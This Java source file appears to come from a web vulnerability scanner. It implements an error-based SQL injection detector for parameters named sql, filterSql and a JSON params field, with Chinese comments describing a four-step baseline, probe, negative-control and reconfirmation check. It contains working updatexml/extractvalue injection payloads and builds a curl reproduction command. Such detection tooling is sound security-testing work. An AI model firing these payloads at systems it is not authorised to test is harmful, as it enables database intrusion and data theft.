package com.jeescan.checks;

import com.jeescan.core.Detector;
import com.jeescan.core.Http;
import com.jeescan.core.Json;
import com.jeescan.core.Result;

/**
 * SQL 报错注入通用检测器（覆盖 #5 #6 #8 #9 #10）。
 *
 * 严格自检四步：
 *   A. 基线：正常请求，记录响应
 *   B. 报错探针：updatexml/extractvalue 注入【随机标记】，期望标记出现在响应里
 *   C. 反例：同结构但用语法错误/不存在的函数，期望不复现标记
 *   D. 二次确认：换一个随机标记再打一次，两次都得出现 —— 排除缓存与巧合
 *
 * 关键：标记必须随机。用固定的 0x7e 或 md5(123456) 会被历史缓存误伤。
 */
public class SqliErrorBased extends Detector {

    public enum Kind {
        /** sql 参数直接注入 */
        SQL_PARAM,
        /** filterSql / fieldName 风格注入 */
        FIELD_PARAM,
        /** JSON 结构里的 params 注入 */
        PARAMS_JSON
    }

    private final String method;
    private final String pathTemplate;   // 可含 %s 占位（GET query 或 body 模板）
    private final Kind kind;
    private final String dbKind;         // mysql / general

    public SqliErrorBased(String id, String name, String endpoint, String cve,
                          String severity, boolean needsAuth, String note,
                          String method, String pathTemplate, Kind kind, String dbKind) {
        super(id, name, endpoint, cve, severity, needsAuth, note);
        this.method = method;
        this.pathTemplate = pathTemplate;
        this.kind = kind;
        this.dbKind = dbKind;
    }

    /** 构造一个带随机标记的报错注入 payload。 */
    private String payload(String marker) {
        String hex = toHex(marker);
        if ("mysql".equalsIgnoreCase(dbKind)) {
            // updatexml 报错，把随机标记塞进 XPATH 错误信息
            return "1' and updatexml(1,concat(0x7e,'" + marker + "',0x7e),1) and '1'='1";
        }
        // 通用：extractvalue 形式
        return "1' and extractvalue(1,concat(0x7e,'" + marker + "',0x7e)) and '1'='1";
    }

    /** 反例：语法故意写坏，期望不复现标记。 */
    private String negativePayload(String marker) {
        return "1' and updatexml_broken_" + marker + "(1,1,1) and '1'='1";
    }

    private static String toHex(String s) {
        StringBuilder sb = new StringBuilder("0x");
        for (int i = 0; i < s.length(); i++) {
            sb.append(String.format("%02x", (int) s.charAt(i)));
        }
        return sb.toString();
    }

    @Override
    public Result run(Ctx ctx) {
        Result res = newResult();
        Http h = ctx.http;
        String path = ctx.p(pathTemplate);
        String url = h.url(path);

        // ---------- A. 基线 ----------
        Http.Resp base = send(h, path, null);
        res.trace("A. 基线（无注入）", method, url, null, base,
                "记录正常响应，作为对照");
        if (isRst(base)) {
            return res.set(Result.State.ERROR, "基线请求被重置/超时：" + base.err);
        }

        // ---------- B. 报错探针 ----------
        String m1 = "s" + rnd(8);
        String p1str = payload(m1);
        Http.Resp p1 = send(h, path, p1str);
        res.trace("B. 报错注入（标记 " + m1 + "）", method, url, p1str, p1,
                "若标记 " + m1 + " 出现在响应中，说明 SQL 被执行且报错回显");
        boolean hit1 = hasIgnoreCase(p1, m1) || hasIgnoreCase(p1, "XPATH")
                || hasIgnoreCase(p1, "updatexml") || hasIgnoreCase(p1, "extractvalue");

        if (!hit1) {
            return res.set(Result.State.SAFE, "报错标记未回显（未见 " + m1 + " 或 XPATH 错误）");
        }

        // ---------- C. 反例：破坏语法 ----------
        String negStr = negativePayload(m1);
        Http.Resp neg = send(h, path, negStr);
        res.trace("C. 反例（破坏函数名）", method, url, negStr, neg,
                "若仍回显 " + m1 + "，说明是固定响应而非注入");
        if (hasIgnoreCase(neg, m1)) {
            return res.set(Result.State.MAYBE,
                    "反例同样回显标记 " + m1 + " —— 疑似固定响应，需人工复核");
        }

        // ---------- D. 二次确认：换标记 ----------
        String m2 = "s" + rnd(8);
        String p2str = payload(m2);
        Http.Resp p2 = send(h, path, p2str);
        res.trace("D. 二次确认（换标记 " + m2 + "）", method, url, p2str, p2,
                "两次不同随机标记都回显才确认，排除缓存");
        boolean hit2 = hasIgnoreCase(p2, m2);

        if (!hit2) {
            return res.set(Result.State.MAYBE,
                    "首次命中标记 " + m1 + "，但二次标记 " + m2 + " 未复现 —— 建议人工复核");
        }

        res.ev("两次随机标记 " + m1 + " / " + m2 + " 均回显，报错注入确认");
        res.ev("反例（破坏函数名）不复现，排除固定响应");
        res.repro("curl -s -X " + method + " '" + url + "' "
                + (p2str != null ? "-d '" + p2str + "'" : ""));
        return res.set(Result.State.VULN, "布尔/报错注入确认（标记 " + m1 + "," + m2 + "）");
    }

    private Http.Resp send(Http h, String path, String inject) {
        switch (kind) {
            case SQL_PARAM: {
                String body = Json.obj("sql", inject == null ? "select 1" : inject);
                return "GET".equalsIgnoreCase(method)
                        ? h.get(path, one("sql", inject == null ? "select 1" : inject))
                        : h.postJson(path, body);
            }
            case FIELD_PARAM: {
                if ("GET".equalsIgnoreCase(method)) {
                    return h.get(path, one("filterSql", inject == null ? "" : inject));
                }
                return h.postJson(path, Json.obj("filterSql", inject == null ? "" : inject));
            }
            case PARAMS_JSON:
            default: {
                String inner = Json.obj("id", inject == null ? "1" : inject);
                String body = Json.rawObj("id", Json.quote("1"),
                        "apiUrl", Json.quote(""),
                        "params", Json.quote(inner));
                return h.postJson(path, body);
            }
        }
    }

    private static java.util.Map<String, String> one(String k, String v) {
        java.util.Map<String, String> m = new java.util.LinkedHashMap<>();
        m.put(k, v);
        return m;
    }
}
